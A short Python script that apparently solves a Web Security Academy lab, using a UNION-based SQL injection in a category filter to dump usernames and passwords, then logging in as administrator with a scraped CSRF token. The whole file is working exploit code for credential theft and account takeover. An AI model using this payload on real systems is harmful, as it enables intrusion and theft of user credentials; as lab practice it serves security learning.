# Retrieving data from other database tables
# Union 2 - Retrieving multiple values in a single column

import requests
from bs4 import BeautifulSoup

# returns 2 columns, only second column returns string data : combine username+password and return in the second field
url_sqli = "https://aca11ff71fdbc554806a28f8006400f6.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,username||'+'||password FROM users--"
url_login = "https://aca11ff71fdbc554806a28f8006400f6.web-security-academy.net/login"

s = requests.Session()

def get_payload():
    # grab csrf token for login
    r_login = s.get(url_login)
    soup1 = BeautifulSoup(r_login.text, 'html.parser')
    csrftoken = soup1.find('input', attrs = {"name":"csrf"})['value']
    r_pw = s.get(url_sqli)
    soup2 = BeautifulSoup(r_pw.text, 'html.parser')
    # dirty workaround to grab creds from the response
    for x in soup2.find_all("tr"):
        h = x.find("th").contents
        if 'administrator' in h[0]:
            user = str(h).split()[0][2:]
            pw = str(h).split()[1][:-2]
    # admin_password = soup2.find(text='administrator').findNext('td').text
    return { 'csrf' : csrftoken, 'username' : 'administrator', 'password' : pw }

try:
    payload = get_payload()    
    r_solve = s.post(url_login, payload)
    if "Congratulations, you solved the lab!" in r_solve.text:
        print("yeet!")
    else:
        print("sad noises :(")
except Exception as e:
    print(e)
